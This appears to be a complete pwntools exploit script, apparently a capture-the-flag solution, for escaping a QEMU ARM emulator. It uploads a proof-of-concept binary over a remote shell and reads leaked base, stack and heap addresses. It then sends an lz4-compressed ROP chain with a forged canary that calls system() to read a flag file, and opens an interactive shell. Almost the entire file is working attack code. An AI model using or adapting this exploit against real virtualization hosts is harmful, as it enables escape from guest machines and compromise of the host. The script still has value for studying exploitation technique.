#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import os
import psutil
import sys
import lz4.block

context.update(arch="amd64",os="linux")
#context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+1100+0', '-e']
context.terminal = ['alacritty', '--title=GDB-Pwn','-o', 'window.dimensions.lines=76', '-o', 'window.dimensions.columns=150', '-o', 'window.position.x=4600', '-o', 'window.position.y=0','-o','font.size=8.0','-e']
context.log_level = 'info'

exe = ELF('qemu-system-arm')
#libc = ELF('./libc.so.6')

def get_pid_by_name(process_name):
    for process in psutil.process_iter(attrs=['pid', 'name']):
        if process.info['name'] == process_name:
            return process.info['pid']
    return None

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

if args.REMOTE:
  host, port = "remote.server", "1337"
else:
  host, port = "127.0.0.1", "1337"

#Â connect to server
p = remote(host,port)
if not args.REMOTE:
  pause()


def upload(src, dst):
  context.log_level = 'error'
  print('wait uploading file...')
  p.sendline('cat >coded <<__EOF__')
  q = process("xz -9c "+src+" | base64 ", shell=True)
  while True:
    try:
      line = q.recvline().strip()
      p.sendlineafter('> ', line)
    except:
      q.close()
      break
  sla('> ', '__EOF__')
  sla('# ', 'base64 -d coded | xzcat -dc > '+dst+';chmod 755 '+dst+';rm coded;ls -al')
  context.log_level = 'info'


p.recvuntil('# ', drop=True)
upload('./poc', 'poc')
sla('> ', './poc')
context.log_level = 'info'
exe.address = int(rcu('qemu base = ','\n'),16)
logleak('exe base', exe.address)
stack = int(rcu('stack buffer = ','\n'),16)
logleak('stack', stack)
heap = int(rcu('heap = ','\n'),16)
logleak('heap', heap)

rop = ROP(exe)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

payload = flat({
  0x1008: p64(0xcafebabe),
  0x1010: p64(1),
  0x1018: p64(2),
  0x1020: p64(3),
  0x1028: p64(pop_rdi),
  0x1030: p64(stack+0x1050),
  0x1038: p64(ret),
  0x1040: p64(exe.sym['system']),
  0x1048: p64(exe.sym['exit']),
  0x1050: b'cat /srv/flag.txt && id\x00',
  0x25e0: p64(stack+0x25e0),
  0x25e8: p64(heap),
  0x25f0: p64(stack+0x25e0),
  0x25f8: p64(1),
  0x2600: p64(0),
  0x2608: p64(0xcafebabe),		# new canary
}, filler=b'\x00')

compressed = lz4.block.compress(payload, mode='high_compression', acceleration=0, compression=12, store_size=False, return_bytearray=False)
print('rop payload size: '+hex(len(payload)))
print(hexdump(payload))
print('compressed rop payload size: '+hex(len(compressed)))
print('preparing payload in file: payload.lz4')
f = open('payload.lz4', 'wb')
f.write(compressed)
f.close()
upload('./payload.lz4','payload.lz4')

sl('./poc 1'.encode())

p.interactive()

